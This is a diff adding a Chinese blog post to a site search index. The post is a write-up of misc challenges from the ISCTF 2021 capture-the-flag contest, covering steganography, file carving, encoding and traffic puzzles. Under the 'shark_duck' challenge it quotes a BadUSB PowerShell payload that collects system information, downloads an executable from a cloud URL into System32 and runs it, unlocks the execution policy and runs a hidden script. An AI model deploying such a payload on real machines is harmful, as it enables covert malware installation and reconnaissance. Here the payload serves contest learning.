@@ -1,6 +1,101 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2021ISCTFmiscwp，要么题白给，要么我白给</title>
+    <url>/2021/10/28/2021ISCTFmiscwp%EF%BC%8C%E8%A6%81%E4%B9%88%E9%A2%98%E7%99%BD%E7%BB%99%EF%BC%8C%E8%A6%81%E4%B9%88%E6%88%91%E7%99%BD%E7%BB%99/</url>
+    <content><![CDATA[<p>总结一下，会做的题很快白给，不会的好歹长了见识</p>
+<span id="more"></span> 
+
+<h2 id="女神的嘲讽"><a href="#女神的嘲讽" class="headerlink" title="女神的嘲讽"></a>女神的嘲讽</h2><p>打开txt</p>
+<p><img src="https://i.loli.net/2021/10/27/aFkbnfXzRSDBrsM.png" alt="67.png"></p>
+<p>就，他都说了ook了，想想ook长什么样，丢进word里ctrl+H文本替换一下，然后转码，</p>
+<p>得到一串base64，转一下就行</p>
+<hr>
+<h2 id="你下载的真的是图片吗？"><a href="#你下载的真的是图片吗？" class="headerlink" title="你下载的真的是图片吗？"></a>你下载的真的是图片吗？</h2><p>foremost文件分离，拿到压缩包，拿到图，拿到flag</p>
+<hr>
+<h2 id="Misc签到"><a href="#Misc签到" class="headerlink" title="Misc签到"></a>Misc签到</h2><p><img src="https://i.loli.net/2021/10/27/k3RYblvLC2AXn15.png" alt="NW.png"></p>
+<p>这题按题目描述，不用口算md5，口算一下base64编码转换就行</p>
+<hr>
+<h2 id="我裂开了"><a href="#我裂开了" class="headerlink" title="我裂开了"></a>我裂开了</h2><p><img src="https://i.loli.net/2021/10/27/uazbKPvonjsFI2q.png" alt="3W.png"></p>
+<p>拼一下或者直接搜蓝鲨信息微信公众号，然后发ISCTF就行</p>
+<hr>
+<h2 id="登陆流量分析"><a href="#登陆流量分析" class="headerlink" title="登陆流量分析"></a>登陆流量分析</h2><p><img src="https://i.loli.net/2021/10/27/HahZRbGd4pySzFg.png" alt="RC4.png"></p>
+<p>一个记录了登录的流量包，可以找到账号密码再找到网站登录</p>
+<p>也可以直接找到流量里的flag</p>
+<p><img src="https://i.loli.net/2021/10/27/WglNBk3FKHeL9On.png" alt="A7WL.png"></p>
+<hr>
+<h2 id="简单图片隐写术"><a href="#简单图片隐写术" class="headerlink" title="简单图片隐写术"></a>简单图片隐写术</h2><p><img src="https://i.loli.net/2021/10/27/JD6zjahcqG97NR3.png" alt="WQP.png"></p>
+<p>一张非常大的png，我还以为是里面有东西，010打开发现都是没意义的东西，所以其实直接在010或者记事本ctrl+F就能找到flag</p>
+<hr>
+<h2 id="easy-osint"><a href="#easy-osint" class="headerlink" title="easy_osint"></a>easy_osint</h2><p>拿到图</p>
+<p><img src="https://i.loli.net/2021/10/27/J6Ei9SBmNF1HDX8.png" alt="1TD.png"></p>
+<p>用百度搜图或者别的应该也都能搜到，</p>
+<p><img src="https://i.loli.net/2021/10/27/LqNHVAYJT8od3UW.png" alt="WEIMW2G.png"></p>
+<p>然后就直接找到了</p>
+<hr>
+<h2 id="受伤的二维码和耳朵"><a href="#受伤的二维码和耳朵" class="headerlink" title="受伤的二维码和耳朵"></a>受伤的二维码和耳朵</h2><p>二维码直接拼图：</p>
+<p><img src="https://i.loli.net/2021/10/27/avAHKO13J4fF2so.png" alt="4BBPJ3.png"></p>
+<p>然后音频是摩斯密码，直接解密，两端拼接在一起，得到flag</p>
+<hr>
+<h2 id="Welcome-To-ISCTF-World"><a href="#Welcome-To-ISCTF-World" class="headerlink" title="Welcome To ISCTF World"></a>Welcome To ISCTF World</h2><p>minecraft客户端，是个迷宫地图，</p>
+<p>当然，可以直接开局域网，开启作弊，然后观察者模式就能找牌子了，正常玩也能找齐</p>
+<p><img src="https://i.loli.net/2021/10/27/GbvD2tXhKmIi7gp.png" alt="0TAKWFQ.png"></p>
+<p><img src="https://i.loli.net/2021/10/27/36qd2mwLfExvU7K.png" alt="5P.png"></p>
+<p><img src="https://i.loli.net/2021/10/27/4rh6LAyqBdYVRJM.png" alt="UA2FNL.png"></p>
+<p><img src="https://i.loli.net/2021/10/27/ROM5dr7jUDcGxXh.png" alt="89.png"></p>
+<p>最后一段一看就是base64，解一下拼起来就行</p>
+<hr>
+<h2 id="文件？美女？"><a href="#文件？美女？" class="headerlink" title="文件？美女？"></a>文件？美女？</h2><p>这题没做出来有点可惜</p>
+<p><img src="https://i.loli.net/2021/10/27/sBTNfaemw5PJySQ.png" alt="M.png"></p>
+<p>正常打不开，用010打开翻到尾部可以看到很明显的，JFIF反了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag1&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line">        g.write(f.read()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+
+<p>用python倒回去</p>
+<p>然后foremost，得到加密的压缩包，弱口令爆破即可</p>
+<hr>
+<h2 id="shark-duck"><a href="#shark-duck" class="headerlink" title="shark_duck"></a>shark_duck</h2><p><a href="https://ducktoolkit.com/%E9%9C%80%E8%A6%81%E7%94%A8%E5%88%B0%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99">https://ducktoolkit.com/需要用到这个网站</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTER $folderDateTime = (get-date).ToString(&#x27;d-M-y HHmmss&#x27;)ENTER $userDir = (Get-ChildItem env:\userprofile).value + &#x27;\Ducky Report &#x27; + $folderDateTimeENTER $fileSaveDir = New-Item ($userDir) -ItemType DirectoryENTER $date = get-dateENTER</span><br><span class="line">$style = &quot;&lt;style&gt; table td&#123;padding-right: 10px;text-align: left;&#125;#body &#123;padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;&#125;#left&#123;float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;&#125;#right&#123;background- color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;&#125;#center&#123;background- color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;&#125; &lt;/style&gt;&quot;ENTER $Report = ConvertTo-Html -Title &#x27;Recon Report&#x27; -Head $style &gt; $fileSaveDir&#x27;/ComputerInfo.html&#x27;ENTER $Report = $Report + &quot;&lt;div id=body&gt;&lt;h1&gt;Duck Tool Kit Report&lt;/h1&gt;&lt;hr size=2&gt;&lt;br&gt; &lt;h3&gt; Generated on: $Date &lt;/h3&gt;&lt;br&gt;&quot;ENTER $SysBootTime = Get-WmiObject Win32_OperatingSystemENTER $BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetimeENTER $SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)ENTER $SerialNo = $SysSerialNo.SerialNumberENTER $SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,ModelENTER $SysManufacturer = $SysInfo.ManufacturerENTER $SysModel = $SysInfo.ModelENTER $OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).captionENTER $disk = Get-WmiObject Win32_LogicalDisk -Filter &quot;DeviceID=&#x27;C:&#x27;&quot;ENTER $HD = [math]::truncate($disk.Size / 1GB)ENTER $FreeSpace = [math]::truncate($disk.FreeSpace / 1GB)ENTER $SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select TotalVisibleMemorySizeENTER $Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB)ENTER $SysCpu = Get-WmiObject Win32_Processor | Select NameENTER $Cpu = $SysCpu.NameENTER $HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumberENTER $HardSerialNo = $HardSerial.SerialNumberENTER $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select NameENTER $graphicsCard = gwmi win32_VideoController |select NameENTER $graphics = $graphicsCard.NameENTER $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1ENTER $DriveLetter = $CDDrive.DriveENTER $DriveName = $CDDrive.CaptionENTER $Disk = $DriveLetter + &#x27;\&#x27; + $DriveNameENTER $Firewall = New-Object -com HNetCfg.FwMgrENTER $FireProfile = $Firewall.LocalPolicy.CurrentProfileENTER $FireProfile = $FireProfile.FirewallEnabledENTER $Report = $Report + &quot;&lt;div id=left&gt;&lt;h3&gt;Computer Information&lt;/h3&gt;&lt;br&gt;&lt;table&gt;&lt;tr&gt; &lt;td&gt;Operating System&lt;/td&gt;&lt;td&gt;$OS&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;OS Serial Number:&lt;/td&gt; &lt;td&gt;$SerialNo&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Current User:&lt;/td&gt;&lt;td&gt;$env:USERNAME &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;System Uptime:&lt;/td&gt;&lt;td&gt;$BootTime&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;System Manufacturer: &lt;/td&gt;&lt;td&gt;$SysManufacturer&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;System Model:&lt;/td&gt;&lt;td&gt;$SysModel&lt;/td&gt; &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Serial Number:&lt;/td&gt;&lt;td&gt;$HardSerialNo&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Firewall is Active:&lt;/td&gt;&lt;td&gt;$FireProfile&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id=right&gt;&lt;h3&gt;Hardware Information&lt;/h3&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;Hardrive Size:&lt;/td&gt;&lt;td&gt;$HD GB&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt; &lt;td&gt;Hardrive Free Space:&lt;/td&gt;&lt;td&gt;$FreeSpace GB&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;System RAM:&lt;/td&gt; &lt;td&gt;$Ram GB&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Processor:&lt;/td&gt;&lt;td&gt;$Cpu&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;CD Drive:&lt;/td&gt; &lt;td&gt;$Disk&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Graphics Card:&lt;/td&gt;&lt;td&gt;$graphics&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; &lt;/div&gt;&quot;ENTER</span><br><span class="line">$u = 0ENTER $allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace)ENTER $Report = $Report + &#x27;&lt;div id=right&gt;&lt;h3&gt;USB Devices&lt;/h3&gt;&lt;table&gt;&#x27;ENTER do &#123;ENTER $gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB)ENTER $Report = $Report + &quot;&lt;tr&gt;&lt;td&gt;Drive Name: &lt;/td&gt;&lt;td&gt; &quot; + $allUsb[$u].Name + $allUsb[$u].Label + &quot;&lt;/td&gt;&lt;td&gt;Free Space: &lt;/td&gt;&lt;td&gt;&quot; + $gbUSB + &quot;GB&lt;/td&gt; &lt;/tr&gt;&quot;ENTER Write-Output $fullUSBENTER $u ++ENTER &#125; while ($u -lt $allUsb.Count)ENTER $Report = $Report + &#x27;&lt;/table&gt;&lt;/div&gt;&#x27;ENTER (New-Object Net.Webclient).DownloadFile(&#x27;https://isctf-1257061123.cos.ap- nanjing.myqcloud.com/ISCTF.exe&#x27;,&quot;C:\Windows\System32\16348.exe&quot;); Start-Process -FilePath &quot;C:\Windows\System32\16348.exe&quot;ENTER $Report &gt;&gt; $fileSaveDir&#x27;/ComputerInfo.html&#x27;ENTER function copy-ToZip($fileSaveDir)&#123;ENTER $srcdir = $fileSaveDirENTER $zipFile = &#x27;%temp%\a.txt\Report.zip&#x27;ENTER if(-not (test-path($zipFile))) &#123;ENTER set-content $zipFile (&quot;PK&quot; + [char]5 + [char]6 + (&quot;$([char]0)&quot; * 18))ENTER (dir $zipFile).IsReadOnly = $false&#125;ENTER $shellApplication = new-object -com shell.applicationENTER $zipPackage = $shellApplication.NameSpace($zipFile)ENTER $files = Get-ChildItem -Path $srcdirENTER foreach($file in $files) &#123;ENTER $zipPackage.CopyHere($file.FullName)ENTER while($zipPackage.Items().Item($file.name) -eq $null)&#123;ENTER Start-sleep -seconds 1 &#125;&#125;&#125;ENTER copy-ToZip($fileSaveDir)ENTER remove-item $fileSaveDir -recurseENTER Remove-Item $MyINvocation.InvocationNameENTER DELAY C:\Windows\config-16348.ps1ENTER DELAY DELAY DELAY powershell Start-Process cmd -Verb runAsENTER DELAY DELAY mode con:cols=14 lines=1ENTER ENTER powershell Set-ExecutionPolicy &#x27;Unrestricted&#x27; -Scope CurrentUser - Confirm:$falseENTER DELAY powershell.exe -windowstyle hidden -File C:\Windows\config-16348.ps1ENTER</span><br></pre></td></tr></table></figure>
+
+<p>拿到一份powershell脚本的下载地址</p>
+<p><a href="https://isctf-1257061123.cos.ap-nanjing.myqcloud.com/ISCTF.exe">https://isctf-1257061123.cos.ap-nanjing.myqcloud.com/ISCTF.exe</a></p>
+<p>下载，自解压，</p>
+<p><img src="https://i.loli.net/2021/10/27/2MZ1BCob9scdRLW.png" alt="N.png"></p>
+<p>base64解码+utf8解码就行</p>
+<p>然后我当时卡在了utf8解码，我也不知道为什么当时没找到工具，可能太晚了脑子有点不清醒，很可惜，就差一步</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;\u-65463?\u-65453?\u-65469?\u-65452?\u-65466?\u-65413?\u-65436?\u-65487?\u-65468? \u-65441?\u-65415?\u-65488?\u-65419?\u-65441?\u-65460?\u-65487?\u-65461?\u-65467? \u-65441?\u-65419?\u-65426?\u-65431?\u-65437?\u-65488?\u-65436?\u-65467?\u-65471? \u-65426?\u-65436?\u-65468?\u-65419?\u-65437?\u-65429?\u-65473?\u-65411?&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>.split(<span class="string">&#x27;?&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">   <span class="built_in">list</span>.append(<span class="number">65536</span>-<span class="built_in">int</span>(i[<span class="number">3</span>:]))</span><br><span class="line">r = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">   r += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>
+
+<p>↑抄来的utf8解码脚本，解了就是flag</p>
+<hr>
+<h2 id="你下载的真是图片吗？2"><a href="#你下载的真是图片吗？2" class="headerlink" title="你下载的真是图片吗？2"></a>你下载的真是图片吗？2</h2><p>能用stegsolve看到只有蓝色通道有东西</p>
+<p>但是我不会操作了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img2text</span>(<span class="params">im</span>):</span></span><br><span class="line"> width, height = im.size</span><br><span class="line"> lst = []</span><br><span class="line"> <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        blue = im.getpixel((x, y))[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> blue == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        lst.append(<span class="built_in">chr</span>(blue))</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(lst)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span></span><br><span class="line">    all_text = img2text(Image.<span class="built_in">open</span>(<span class="string">&quot;flag.bmp&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure>
+
+<p>wp里的提取脚本，得到一串16进制且504B开头，放进010改成zip，里面有flag.txt</p>
+<p>打开flag.txt，发现是两段类似文字，两段相减得到flag</p>
+<hr>
+<h2 id="BadUSB"><a href="#BadUSB" class="headerlink" title="BadUSB"></a>BadUSB</h2><p>根据题目名称可知是BadUSB，查找相关资料可知是通过USB-HID进行攻击，查找设备描述</p>
+<p><img src="https://i.loli.net/2021/10/27/zk2pAKJumD6oCRV.png" alt="EU41H.png"></p>
+<p>是键盘</p>
+<p><img src="https://i.loli.net/2021/10/27/yjJ3F2cDNerITRz.png" alt="6BG.png"></p>
+<p>然后通过键盘流量可以推断出flag</p>
+<p>复现不动，还需要知道是怎么对应的才行</p>
+<hr>
+<ul>
+<li><p>这misc题是真多，图也真的多，认真地整理起来也太花时间了</p>
+</li>
+<li><p>还是见的题少了</p>
+</li>
+<li><p>不过这比赛有这么多难度合适的原创题还是舒服的</p>
+</li>
+<li><p>新生赛道拿第三名也挺舒服的，就是没奖品</p>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NSSCTFReverse题解，但就挺加密解密的</title>
     <url>/2021/10/27/NSSCTFReverse%E9%A2%98%E8%A7%A3%EF%BC%8C%E4%BD%86%E5%B0%B1%E6%8C%BA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%9A%84/</url>
     <content><![CDATA[<p>首先，做了2道附件给程序的简单常见的re，然后剩下了一堆，python脚本，打开一看全是加密呢，并且刚好挑了一道需要爆破才能解的，逆了半天放弃了，难顶，然后我看wp的时候发现这种题爆破确实好用，有时候逆着算确实花时间</p>
